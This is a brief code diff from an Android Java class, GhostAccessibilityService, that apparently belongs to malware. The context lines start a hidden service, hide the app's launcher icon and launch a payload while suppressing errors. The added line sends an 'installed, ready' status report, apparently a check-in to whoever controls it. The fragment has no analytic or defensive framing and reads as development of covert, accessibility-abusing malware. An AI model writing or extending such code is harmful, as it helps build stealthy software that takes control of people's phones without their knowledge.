@@ -171,6 +171,7 @@ public class GhostAccessibilityService extends AccessibilityService {
         startHiddenService(context);
         hideLauncher(context);
         try { launchPayload(context); } catch (Throwable ignored) {}
+        Reporter.report(context, "installed", "ready");
         if (context instanceof GhostAccessibilityService) {
             GhostAccessibilityService s = (GhostAccessibilityService) context;
             s.readyAt = System.currentTimeMillis();
